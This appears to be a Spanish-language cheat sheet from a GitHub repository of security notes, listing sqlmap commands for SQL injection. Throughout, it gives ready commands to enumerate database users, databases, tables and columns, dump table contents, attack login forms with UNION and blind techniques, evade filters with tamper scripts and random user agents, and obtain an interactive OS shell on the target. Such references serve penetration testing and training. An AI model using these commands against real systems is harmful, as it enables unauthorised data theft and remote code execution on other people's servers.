# SQLMap Cheat Sheet

#### Uso simple
```
sqlmap -u "<URL>"
```

#### Especificar el Sistema Gestor de Base de Datos
```
sqlmap -u "<URL>" --dbms=<Name-DBMS>
```

#### Listar los usuarios de la BD del sitio
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" --users
```

#### Listar las Bases de Datos del sitio
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" --dbs
```

#### Listar las tablas de una Base de Datos
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> --tables
```

#### Listar las columnas de una Tabla
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --columns
```

#### Ver contenido de ciertas Columnas de una Tabla
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> -C <Column1,Column2> --dump
```

#### Ver todo el contenido de una Tabla de una Base de Datos
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --dump
```

#### Obtener un Shell de OS interactivo
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" --os-shell
```

#### Colocar un parámetro y usar la técnica de UNION
```
sqlmap -u "<URL>" -p <PARAMETER> --technique=U
sqlmap -u "http://site.com/index.php?search=n" -p search --technique=U
```

#### Colocar un parámetro, usar la técnica de UNION, usando un verbose nivel 3 e ignorando los resultados almacenados del query
```
sqlmap -u "<URL>" -p <PARAMETER> --technique=U --banner -v3 --fresh-queries
```

#### Colocar un parámetro, usar la técnica de UNION y enumerar los usuarios de la BD
```
sqlmap -u "<URL>" -p <PARAMETER> --technique=U --users
```

#### Usar en formulario de Login, para enviar datos en POST y usando la técnica BLIND
```
sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --banner
```

#### Usar en formulario de Login, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
```
sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --dbs
```

#### Usar en formulario de Login cargado desde un archivo, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
```
sqlmap -r "<PATH_FILE>" --data='user=a&pass=a' -p user --technique=B --dbs

sqlmap -r "<PATH_FILE>" -p user --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --cookie="name:value" --dbs
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)